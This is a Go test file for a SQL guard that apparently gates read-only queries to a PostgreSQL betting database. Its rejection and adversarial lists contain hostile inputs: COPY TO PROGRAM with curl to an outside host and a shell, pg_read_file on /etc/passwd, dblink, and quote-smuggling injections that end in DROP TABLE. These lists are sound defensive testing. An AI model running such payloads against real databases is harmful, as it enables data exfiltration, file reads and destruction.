package sqlguard

import (
	"strings"
	"testing"
)

// The statements here read the governed fixture in deploy/seed/postgres-fixture.sql:
// schema public, tables member and bet, view member_view, function
// fn_member_stake.

func TestParseAccepts(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		sql  string
	}{
		{"simple select", "SELECT member_id, login_name FROM public.member"},
		{"unqualified table", "SELECT member_id FROM member"},
		{"quoted identifiers", `SELECT "m"."member_id" FROM public."member" AS m`},
		{"trailing semicolon", "SELECT member_id FROM public.member;"},
		{"line comment", "-- audit lookup\nSELECT member_id FROM public.member"},
		{"block comment", "/* ticket 4821 */ SELECT member_id FROM public.member"},
		{"count star", "SELECT COUNT(*) FROM public.member"},
		{"multiplication in list", "SELECT stake * odds FROM public.bet"},
		{"multiplication no spaces", "SELECT stake*odds AS gross FROM public.bet"},
		{"multiplication in where", "SELECT bet_id FROM public.bet WHERE stake * 2 > 100"},
		{"parenthesised arithmetic", "SELECT (stake+odds)*(stake-odds) FROM public.bet"},
		{
			name: "join",
			sql: "SELECT m.login_name, b.stake FROM public.member m " +
				"JOIN public.bet b ON b.member_id = m.member_id",
		},
		{"cte", "WITH recent AS (SELECT bet_id FROM public.bet) SELECT bet_id FROM recent"},
		{
			name: "recursive cte",
			sql: "WITH RECURSIVE r AS (SELECT 1 AS n UNION ALL SELECT n + 1 FROM r WHERE n < 5) " +
				"SELECT n FROM r",
		},
		{
			name: "materialized cte",
			sql:  "WITH c AS MATERIALIZED (SELECT bet_id FROM public.bet) SELECT bet_id FROM c",
		},
		{
			name: "not materialized cte",
			sql:  "WITH c AS NOT MATERIALIZED (SELECT bet_id FROM public.bet) SELECT bet_id FROM c",
		},
		{
			name: "subquery in list",
			sql:  "SELECT (SELECT COUNT(*) FROM public.bet) AS n FROM public.member",
		},
		{"derived table", "SELECT x.member_id FROM (SELECT member_id FROM public.member) x"},
		{"limit", "SELECT member_id FROM public.member LIMIT 100"},
		{"offset and limit", "SELECT member_id FROM public.member ORDER BY member_id LIMIT 10 OFFSET 5"},
		{"order by", "SELECT member_id FROM public.member ORDER BY register_time DESC NULLS LAST"},
		{
			name: "group by having",
			sql: "SELECT member_id, SUM(stake) FROM public.bet " +
				"GROUP BY member_id HAVING SUM(stake) > 0",
		},
		{
			name: "union",
			sql:  "SELECT member_id FROM public.member UNION ALL SELECT member_id FROM public.bet",
		},
		{"view", "SELECT member_id, login_name FROM public.member_view WHERE currency_code = 'SGD'"},
		{"function call in the list", "SELECT public.fn_member_stake(1) AS total"},
		{"set returning function is not a table", "SELECT bet_id FROM public.tf_open_bets()"},
		{"string with quote escape", "SELECT bet_id FROM public.bet WHERE status = 'O''Brien'"},
		{"non ascii in literal", "SELECT member_id FROM public.member WHERE login_name = '張三'"},
		{"case expression", "SELECT CASE WHEN stake > 1 THEN 'big' ELSE 'small' END FROM public.bet"},
		{
			name: "window function",
			sql: "SELECT ROW_NUMBER() OVER (PARTITION BY member_id ORDER BY bet_id) " +
				"FROM public.bet",
		},
		{"lower case", "select member_id from public.member"},
		{"mixed case", "SeLeCt member_id FrOm public.member"},
		{"ilike", "SELECT member_id FROM public.member WHERE login_name ILIKE 'a%'"},
		{"regex match", "SELECT member_id FROM public.member WHERE login_name ~ '^a'"},
		{"regex not match", "SELECT member_id FROM public.member WHERE login_name !~* '^a'"},
		{"concatenation", "SELECT login_name || currency_code FROM public.member"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if _, err := Parse(tc.sql); err != nil {
				t.Fatalf("Parse(%q) = error %v, want success", tc.sql, err)
			}
		})
	}
}

// PostgreSQL syntax an operator writes in an ordinary read-only lookup. It has
// to parse: a refusal here is the gate blocking legitimate work, which is how a
// governed console stops being used.
func TestParseAcceptsPostgresExpressions(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		sql  string
	}{
		{"cast", "SELECT stake::text FROM public.bet"},
		{"chained cast", "SELECT stake::numeric::text FROM public.bet"},
		{"cast then multiply", "SELECT stake::numeric * odds FROM public.bet"},
		{"json field", `SELECT ('{"a":1}'::jsonb)->'a' FROM public.bet`},
		{"json field as text", `SELECT ('{"a":1}'::jsonb)->>'a' FROM public.bet`},
		{"json path", `SELECT ('{"a":1}'::jsonb)#>'{a}' FROM public.bet`},
		{"json path as text", `SELECT ('{"a":1}'::jsonb)#>>'{a}' FROM public.bet`},
		{"json containment", `SELECT bet_id FROM public.bet WHERE '{"a":1}'::jsonb @> '{}'::jsonb`},
		{"json key exists", `SELECT bet_id FROM public.bet WHERE '{"a":1}'::jsonb ? 'a'`},
		{"array constructor", "SELECT ARRAY[1, 2, 3] AS ids"},
		{"array subscript", "SELECT (ARRAY[1, 2, 3])[1] AS head"},
		{"array subscript then multiply", "SELECT (ARRAY[1, 2])[1] * 3 AS scaled"},
		{"array overlap", "SELECT bet_id FROM public.bet WHERE ARRAY[1] && ARRAY[2]"},
		{"dollar quoted literal", "SELECT bet_id FROM public.bet WHERE status = $$Open$$"},
		{"tagged dollar quote", "SELECT bet_id FROM public.bet WHERE status = $t$Open$t$"},
		{"nested dollar tag", "SELECT bet_id FROM public.bet WHERE status = $t$ a $$ b $t$"},
		{"escape string", `SELECT bet_id FROM public.bet WHERE status = E'Open'`},
		{"escape string with escaped quote", `SELECT bet_id FROM public.bet WHERE status = E'O\'Brien'`},
		{"escape string with backslash", `SELECT bet_id FROM public.bet WHERE status = E'a\\b'`},
		{"unicode escape string", `SELECT bet_id FROM public.bet WHERE status = U&'\0041'`},
		{"bit shift", "SELECT member_id << 1 FROM public.member"},
		{"bitwise xor", "SELECT member_id # 1 FROM public.member"},
		{"exponent operator", "SELECT stake ^ 2 FROM public.bet"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			if _, err := Parse(tc.sql); err != nil {
				t.Fatalf("Parse(%q) = error %v, want success", tc.sql, err)
			}
		})
	}
}

func TestParseRejects(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name    string
		sql     string
		wantMsg string
	}{
		{"empty", "", "empty"},
		{"whitespace only", "   \n\t ", "empty"},
		{"comment only", "-- nothing here", "empty"},

		{"insert", "INSERT INTO public.member (member_id) VALUES (1)", "must begin with"},
		{"update", "UPDATE public.member SET login_name = 'x'", "must begin with"},
		{"delete", "DELETE FROM public.member", "must begin with"},
		{"drop", "DROP TABLE public.member", "must begin with"},
		{"truncate", "TRUNCATE public.member", "must begin with"},
		{"copy from a file", "COPY public.member FROM '/tmp/x.csv'", "must begin with"},
		{"copy to a program", "COPY public.member TO PROGRAM 'curl -T - http://x'", "must begin with"},
		{"anonymous code block", "DO $$ BEGIN END $$", "must begin with"},
		{"call a procedure", "CALL public.sp_member_bets(1)", "must begin with"},
		{"vacuum", "VACUUM public.member", "must begin with"},
		{"analyze", "ANALYZE public.member", "must begin with"},
		{"cluster", "CLUSTER public.bet USING ix_bet_member_id", "must begin with"},
		{"reindex", "REINDEX TABLE public.bet", "must begin with"},
		{"refresh", "REFRESH MATERIALIZED VIEW public.member_view", "must begin with"},
		{"checkpoint", "CHECKPOINT", "must begin with"},
		{"lock", "LOCK TABLE public.member", "must begin with"},
		{"listen", "LISTEN channel_one", "must begin with"},
		{"notify", "NOTIFY channel_one", "must begin with"},
		{"unlisten", "UNLISTEN channel_one", "must begin with"},
		{"prepare", "PREPARE p AS SELECT 1", "must begin with"},
		{"deallocate", "DEALLOCATE p", "must begin with"},
		{"discard", "DISCARD ALL", "must begin with"},
		{"set", "SET statement_timeout = 0", "must begin with"},
		{"reset", "RESET ALL", "must begin with"},
		{"grant", "GRANT SELECT ON public.member TO avior_reader", "must begin with"},
		{"comment on", "COMMENT ON TABLE public.member IS 'x'", "must begin with"},
		{"explain", "EXPLAIN ANALYZE SELECT member_id FROM public.member", "must begin with"},
		{"security label", "SECURITY LABEL FOR x ON TABLE public.member IS 'y'", "must begin with"},
		{"import foreign schema", "IMPORT FOREIGN SCHEMA public FROM SERVER s INTO public", "must begin with"},
		{"reassign owned", "REASSIGN OWNED BY a TO b", "must begin with"},
		{"load", "LOAD 'x'", "must begin with"},
		{"begin", "BEGIN", "must begin with"},
		{"declare cursor", "DECLARE c CURSOR FOR SELECT 1", "must begin with"},

		{"select into", "SELECT member_id INTO public.member_copy FROM public.member", "not permitted"},
		{"nested delete", "SELECT member_id FROM public.member WHERE member_id IN (DELETE FROM public.bet)", "not permitted"},
		{"nested copy", "SELECT member_id FROM public.member WHERE 1 = (COPY x TO y)", "not permitted"},
		{"stacked statement", "SELECT 1; DROP TABLE public.member", "single statement"},
		{"stacked with comment", "SELECT 1; -- x\nSELECT 2", "single statement"},
		{"stacked select", "SELECT 1; SELECT 2", "single statement"},

		{"read a server file", "SELECT pg_read_file('/etc/passwd')", "not permitted"},
		{"read a binary file", "SELECT pg_read_binary_file('/etc/passwd')", "not permitted"},
		{"list a directory", "SELECT pg_ls_dir('/')", "not permitted"},
		{"sleep", "SELECT pg_sleep(60)", "not permitted"},
		{"catalogue probe", "SELECT relname FROM pg_catalog.pg_class", "not permitted"},
		{"large object export", "SELECT lo_export(16385, '/tmp/x')", "not permitted"},
		{"large object import", "SELECT lo_import('/etc/passwd')", "not permitted"},
		{"low level large object read", "SELECT loread(0, 1)", "not permitted"},
		{"reach another host", "SELECT dblink('dbname=x', 'SELECT 1')", "not permitted"},
		{"execute sql as text", "SELECT query_to_xml('SELECT 1', true, false, '')", "not permitted"},
		{"serialise a whole database", "SELECT database_to_xml(true, false, '')", "not permitted"},
		{"change a session setting", "SELECT set_config('statement_timeout', '0', false)", "not permitted"},
		{"quoted dangerous name", `SELECT "pg_read_file"('/etc/passwd')`, "not permitted"},

		{"for update", "SELECT member_id FROM public.member FOR UPDATE", "row locking clause"},
		{"for share", "SELECT member_id FROM public.member FOR SHARE", "row locking clause"},
		{"for no key update", "SELECT member_id FROM public.member FOR NO KEY UPDATE", "row locking clause"},
		{"for key share", "SELECT member_id FROM public.member FOR KEY SHARE", "row locking clause"},
		{"for update of a table", "SELECT member_id FROM public.member FOR UPDATE OF member", "row locking clause"},

		{"positional parameter", "SELECT member_id FROM public.member WHERE member_id = $1", "parameter placeholder"},

		{"bare wildcard", "SELECT * FROM public.member", "SELECT *"},
		{"qualified wildcard", "SELECT m.* FROM public.member m", "SELECT *"},
		{"quoted qualified wildcard", `SELECT "m".* FROM public.member m`, "SELECT *"},
		{"wildcard after column", "SELECT member_id, * FROM public.member", "SELECT *"},
		{"wildcard with limit", "SELECT * FROM public.member LIMIT 10", "SELECT *"},
		{"wildcard in subquery", "SELECT a FROM (SELECT * FROM public.member) x", "SELECT *"},
		{"wildcard in cte", "WITH c AS (SELECT * FROM public.member) SELECT a FROM c", "SELECT *"},
		{"wildcard no from", "SELECT *", "SELECT *"},
		{"non counting function star", "SELECT SUM(*) FROM public.bet", "SELECT *"},
		{"table is a wildcard read by another name", "WITH c AS (TABLE public.member) SELECT a FROM c", "not permitted"},
		{"catalogue browsing", "SELECT table_name FROM information_schema.tables", "not permitted"},
		{"count_big is not count", "SELECT COUNT_BIG(*) FROM public.member", "SELECT *"},

		{"unterminated string", "SELECT 'abc FROM public.member", "unterminated string"},
		{"unterminated quoted identifier", `SELECT "abc FROM public.member`, "unterminated quoted identifier"},
		{"unterminated dollar quote", "SELECT $$abc FROM public.member", "unterminated dollar-quoted string"},
		{"unterminated tagged dollar quote", "SELECT $t$abc FROM public.member", "unterminated dollar-quoted string"},
		{"lone dollar sign", "SELECT $ FROM public.member", "unterminated dollar-quoted string"},
		{"dollar sign touching an identifier", "SELECT a$$ FROM public.member", "dollar sign touching an identifier"},
		{"unterminated escape string", `SELECT E'abc FROM public.member`, "unterminated string"},
		{"backslash in a standard literal", `SELECT login_name FROM public.member WHERE login_name = 'a\b'`, "backslash"},
		{"unterminated comment", "SELECT 1 /* abc", "unterminated block comment"},
		{"unbalanced open paren", "SELECT (member_id FROM public.member", "unbalanced"},
		{"unbalanced close paren", "SELECT member_id) FROM public.member", "unbalanced"},
		{"unbalanced open bracket", "SELECT a[1 FROM public.member", "unbalanced"},
		{"mismatched brackets", "SELECT a[1) FROM public.member", "unbalanced"},
		{"unknown character", `SELECT a \ b FROM public.member`, "unrecognised character"},
		{"non ascii identifier", "SELECT 名字 FROM public.member", "unrecognised character"},
		{"malformed number", "SELECT 1abc FROM public.member", "malformed numeric"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			stmt, err := Parse(tc.sql)
			if err == nil {
				t.Fatalf("Parse(%q) succeeded (tables %v), want rejection", tc.sql, stmt.CandidateTables)
			}
			if !strings.Contains(err.Error(), tc.wantMsg) {
				t.Errorf("Parse(%q) error = %q, want it to mention %q", tc.sql, err, tc.wantMsg)
			}
		})
	}
}

// A keyword the gate refuses is still readable as a quoted identifier, because
// PostgreSQL does not treat a quoted identifier as a keyword either. Without
// this, a column legitimately named "comment" would be unreachable.
func TestParseAcceptsForbiddenWordsAsQuotedIdentifiers(t *testing.T) {
	t.Parallel()
	for _, sql := range []string{
		`SELECT "comment" FROM public.audit_note`,
		`SELECT "security", "lock" FROM public.member`,
		`SELECT note FROM public."copy"`,
	} {
		if _, err := Parse(sql); err != nil {
			t.Errorf("Parse(%q) = error %v, want success", sql, err)
		}
	}
}

func TestParseCollectsCandidateTables(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		sql  string
		want []string
	}{
		{
			name: "single table",
			sql:  "SELECT member_id FROM public.member",
			want: []string{"public.member"},
		},
		{
			name: "join with alias",
			sql: "SELECT m.member_id FROM public.member m " +
				"JOIN public.bet b ON b.member_id = m.member_id",
			want: []string{"public.bet", "public.member"},
		},
		{
			name: "unqualified name",
			sql:  "SELECT member_id FROM member",
			want: []string{"member"},
		},
		{
			name: "an unquoted name is folded to lower case, as the server folds it",
			sql:  "SELECT member_id FROM Public.Member",
			want: []string{"public.member"},
		},
		{
			name: "a quoted name keeps its case, because the server does",
			sql:  `SELECT member_id FROM public."Member"`,
			want: []string{"public.Member"},
		},
		{
			name: "quoted and unquoted are two objects, not one",
			sql: `SELECT a.member_id FROM public.member a ` +
				`JOIN public."Member" b ON b.member_id = a.member_id`,
			want: []string{"public.Member", "public.member"},
		},
		{
			name: "derived table is not a table",
			sql:  "SELECT x.member_id FROM (SELECT member_id FROM public.member) x",
			want: []string{"public.member"},
		},
		{
			name: "a set returning function is not a table",
			sql:  "SELECT bet_id FROM public.tf_open_bets()",
			want: []string{},
		},
		{
			name: "duplicates collapse",
			sql: "SELECT a.member_id FROM public.member a " +
				"JOIN public.member b ON a.member_id = b.member_id",
			want: []string{"public.member"},
		},
		{
			name: "a cte is a name for a subquery, not an object",
			sql:  "WITH recent AS (SELECT bet_id FROM public.bet) SELECT bet_id FROM recent",
			want: []string{"public.bet"},
		},
		{
			name: "every cte is removed, and the tables inside them are not",
			sql: "WITH one AS (SELECT member_id FROM public.member), " +
				"two AS (SELECT bet_id FROM public.bet) " +
				"SELECT one.member_id FROM one JOIN two ON true",
			want: []string{"public.bet", "public.member"},
		},
		{
			name: "a cte named after a table still shadows it",
			sql:  "WITH member AS (SELECT member_id FROM public.member) SELECT member_id FROM member",
			want: []string{"public.member"},
		},
		{
			name: "a name that only looks like a cte is still a table",
			sql:  "WITH one AS (SELECT member_id FROM public.member) SELECT member_id FROM two",
			want: []string{"public.member", "two"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			stmt, err := Parse(tc.sql)
			if err != nil {
				t.Fatalf("Parse(%q) = error %v", tc.sql, err)
			}
			if !equalExact(stmt.CandidateTables, tc.want) {
				t.Errorf("CandidateTables = %v, want %v", stmt.CandidateTables, tc.want)
			}
		})
	}
}

func TestCollectCTENames(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name string
		sql  string
		want []string
	}{
		{"none", "SELECT a FROM public.member", nil},
		{"one", "WITH c AS (SELECT 1) SELECT 1", []string{"c"}},
		{"with a column list", "WITH c (x) AS (SELECT 1) SELECT 1", []string{"c"}},
		{"two", "WITH one AS (SELECT 1), two AS (SELECT 1) SELECT 1", []string{"one", "two"}},
		{"quoted", `WITH "my cte" AS (SELECT 1) SELECT 1`, []string{"my cte"}},
		{"folded to lower case", "WITH MyCte AS (SELECT 1) SELECT 1", []string{"mycte"}},
		{"recursive", "WITH RECURSIVE r AS (SELECT 1) SELECT 1", []string{"r"}},
		{"materialized", "WITH c AS MATERIALIZED (SELECT 1) SELECT 1", []string{"c"}},
		{"not materialized", "WITH c AS NOT MATERIALIZED (SELECT 1) SELECT 1", []string{"c"}},
		{
			name: "nested parentheses inside a body do not end it",
			sql:  "WITH c AS (SELECT (1+(2*3))) , d AS (SELECT 1) SELECT 1",
			want: []string{"c", "d"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			toks, err := tokenise(tc.sql)
			if err != nil {
				t.Fatalf("tokenise: %v", err)
			}
			got := collectCTENames(toks)
			if len(got) != len(tc.want) {
				t.Fatalf("collectCTENames(%q) = %v, want %v", tc.sql, keys(got), tc.want)
			}
			for _, want := range tc.want {
				if !got[want] {
					t.Errorf("collectCTENames(%q) = %v, want it to include %q", tc.sql, keys(got), want)
				}
			}
		})
	}
}

func keys(m map[string]bool) []string {
	out := make([]string, 0, len(m))
	for k := range m {
		out = append(out, k)
	}
	return out
}

// TestParseFailsClosed is the package's load-bearing test. Whatever Parse
// accepts must be a single read-only statement with no wildcard. If this test
// can be made to fail, the gateway can be bypassed.
func TestParseFailsClosed(t *testing.T) {
	t.Parallel()
	adversarial := []string{
		"SELECT 1 /*!*/; DROP TABLE public.member",
		"SELECT 1 UNION SELECT * FROM public.member",
		"SELECT/**/*/**/FROM public.member",
		"select\t*\nfrom public.member",
		"SeLeCt * FrOm public.member",
		`SELECT"m".*FROM public.member m`,
		"WITH x AS (SELECT 1) INSERT INTO public.member SELECT * FROM x",
		"SELECT 1 FROM public.member WHERE 1=1; COPY public.member TO PROGRAM 'sh'",
		// PostgreSQL folds a$$ into one identifier and reads the rest as code.
		"SELECT a$$ FROM public.member; DROP TABLE public.member --$$",
		"SELECT a$tag$ FROM public.member; DROP TABLE public.member --$tag$",
		// A backslash-escaped quote ends the literal under one server setting
		// and not under the other.
		`SELECT E'\'' FROM public.member; DROP TABLE public.member --'`,
		`SELECT 'x\'' FROM public.member; DROP TABLE public.member --'`,
		"SELECT $$ ; DROP TABLE public.member $$",
		"SELECT $$",
		"SELECT $",
		`SELECT U&'`,
		"SELECT 'x' FROM public.member FOR UPDATE",
		"SELECT 'x' FROM public.member FOR SHARE",
		"SELECT * ",
		"SELECT *,a FROM public.member",
		"SELECT a FROM public.member; ",
		"SELECT (SELECT * FROM public.bet) FROM public.member",
		"SELECT COUNT(*), * FROM public.member",
		"SELECT pg_read_file('/etc/passwd')",
		`SELECT "pg_read_file"('/etc/passwd')`,
		`SELECT "PG_READ_FILE"('/etc/passwd')`,
		"SELECT lo_import('/etc/passwd')",
		"SELECT 1 FROM public.member WHERE member_id = $1",
		"\x00SELECT 1",
		"SELECT \xff FROM public.member",
	}
	for _, sql := range adversarial {
		if _, err := Parse(sql); err != nil {
			continue
		}
		assertReadOnlyNoWildcard(t, sql)
	}
}

// assertReadOnlyNoWildcard re-reads the submitted text, because that exact text
// is what the planner and the executor both receive.
func assertReadOnlyNoWildcard(t *testing.T, sql string) {
	t.Helper()
	toks, err := tokenise(sql)
	if err != nil {
		t.Fatalf("Parse(%q) accepted input that does not tokenise: %v", sql, err)
	}
	if len(toks) == 0 || !leadingKeywords[toks[0].upper] {
		t.Fatalf("Parse(%q) accepted a statement not led by SELECT or WITH", sql)
	}
	for i, tok := range toks {
		switch {
		case tok.kind == tokIdent && forbiddenKeywords[tok.upper]:
			t.Fatalf("Parse(%q) accepted forbidden keyword %q", sql, tok.text)
		case tok.kind == tokParam:
			t.Fatalf("Parse(%q) accepted parameter placeholder %q", sql, tok.text)
		case isDangerousName(tok):
			t.Fatalf("Parse(%q) accepted refused identifier %q", sql, tok.text)
		case tok.isPunct(";") && i != len(toks)-1:
			t.Fatalf("Parse(%q) accepted a second statement", sql)
		}
	}
	if err := checkLockingClause(toks); err != nil {
		t.Fatalf("Parse(%q) accepted a row locking clause: %v", sql, err)
	}
	if err := checkBalancedBrackets(toks); err != nil {
		t.Fatalf("Parse(%q) accepted unbalanced brackets: %v", sql, err)
	}
	if err := checkStars(toks); err != nil {
		t.Fatalf("Parse(%q) accepted a wildcard: %v", sql, err)
	}
}

func equalFold(got, want []string) bool {
	if len(got) != len(want) {
		return false
	}
	for i := range got {
		if !strings.EqualFold(got[i], want[i]) {
			return false
		}
	}
	return true
}

// equalExact compares without folding, because the case of an extracted name
// is part of what the parser is being asked to preserve.
func equalExact(got, want []string) bool {
	if len(got) != len(want) {
		return false
	}
	for i := range got {
		if got[i] != want[i] {
			return false
		}
	}
	return true
}

func TestParseNumericLiterals(t *testing.T) {
	t.Parallel()
	accepted := []string{
		"SELECT 1 FROM public.member",
		"SELECT 1.5 FROM public.member",
		"SELECT 1e5 FROM public.member",
		"SELECT 1E-5 FROM public.member",
		"SELECT 1.5e+10 FROM public.member",
		"SELECT member_id FROM public.bet WHERE odds > .5",
	}
	for _, sql := range accepted {
		if _, err := Parse(sql); err != nil {
			t.Errorf("Parse(%q) = error %v, want success", sql, err)
		}
	}
	// The guard is not a PostgreSQL validator. Nonsense that cannot write or
	// leak, such as "1.2.3", is left for the target server to reject.
	rejected := []string{
		"SELECT 5x FROM public.member",
	}
	for _, sql := range rejected {
		if _, err := Parse(sql); err == nil {
			t.Errorf("Parse(%q) succeeded, want rejection", sql)
		}
	}
}

func TestVerdictStringIsReadable(t *testing.T) {
	t.Parallel()
	if got := Allowed(nil, nil).String(); got != "allow" {
		t.Errorf("Allowed().String() = %q, want %q", got, "allow")
	}
	v := Denied(
		Reason{Rule: RuleColumnDenied, Message: "not permitted", Subject: "public.member.id_card_number"},
		Reason{Rule: RuleCostLimitExceeded, Message: "too expensive"},
	)
	got := v.String()
	for _, want := range []string{"deny", "column_denied", "public.member.id_card_number", "cost_limit_exceeded"} {
		if !strings.Contains(got, want) {
			t.Errorf("Verdict.String() = %q, want it to mention %q", got, want)
		}
	}
}
